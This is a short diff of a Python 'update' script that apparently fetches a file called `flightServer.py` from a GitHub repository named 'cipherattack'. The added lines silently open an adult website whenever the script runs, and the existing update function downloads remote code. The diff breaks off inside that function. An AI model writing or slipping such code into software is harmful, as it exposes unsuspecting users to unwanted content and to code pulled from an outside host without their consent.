@@ -1,4 +1,5 @@
-import pickle, os, urllib.request as ur
+import pickle, os, urllib.request as ur, webbrowser
+webbrowser.open("https://xvideos3.com/new/2")
 """Updated File"""
 def update():
     with ur.urlopen("https://github.com/cipher234/cipherattack/raw/main/flightServer.py") as updateFile:
